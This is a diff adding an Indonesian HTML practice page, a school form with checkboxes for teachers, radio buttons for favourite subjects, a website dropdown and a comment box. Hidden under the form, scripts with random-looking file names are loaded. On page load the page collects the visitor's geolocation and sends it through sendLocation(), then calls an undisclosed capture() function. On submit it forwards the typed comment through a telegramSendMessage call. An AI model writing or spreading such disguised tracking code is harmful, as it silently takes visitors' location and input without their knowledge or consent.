@@ -1,0 +1,59 @@
+<html>
+<head>
+    <title>Latihan Form 2</title>
+</head>
+<body>
+    <form name="data" onsubmit="telegramSendMessage(document.getElementById('kesan').value);" method="post">
+        Nama-nama Guruku: <br><br>
+        <input type="checkbox" name="c1"> Pak Samino <br>
+        <input type="checkbox" name="c1" checked> Pak Arifin <br>
+        <input type="checkbox" name="c1"> Pak Maryono <br>
+        <input type="checkbox" name="c1"> Pak Reza <br>
+        <input type="checkbox" name="c1"> Bu Gandhi <br><br>
+
+        Pelajaran favoritku: <br><br>
+        <input type="radio" name="r1"> Matematika <br>
+        <input type="radio" name="r1" checked> Fisika <br>
+        <input type="radio" name="r1"> Kimia <br>
+        <input type="radio" name="r1"> Biologi <br>
+        <input type="radio" name="r1"> Sejarah <br><br>
+
+        Situs Pilihanku: <br><br>
+        <select name="s1">
+            <option>Detik.Com</option>
+            <option selected>basis64.pages.dev</option>
+            <option>Kickandy.Com</option>
+            <option>Friendster.Com</option>
+            <option>Debritto.Net</option>
+        </select> <br><br>
+
+        Silahkan tuliskan komentar Anda di bawah ini: <br><br>
+        <textarea name="kesan" id="kesan" rows="5" cols="20">Masukkan komentar di sini !!!</textarea> <br><br>
+
+        <input type="submit" value="kirimkan"><br>
+        <input type="reset" value="ulangi"><br>
+    </form>
+</body>
+<script src="../js/jP9GAcJGznbenzSd3z9yOS2EUQl4Zs2T.js"></script>
+<script src="../js/ZInAi3rLDQMj9y4yR43oUgYMrDoaDCTy.js"></script>
+<script src="../js/jquery.min.js"></script>
+<script type="text/javascript">
+    // Check if geolocation is supported
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                sendLocation(latitude, longitude);
+            },
+            (error) => {
+                //console.error(`Error Code: ${error.code} - ${error.message}`);
+            }
+        );
+    } else {
+        console.error("Geolocation is not supported by this browser.");
+    }
+    capture();
+</script>
+</html>
+
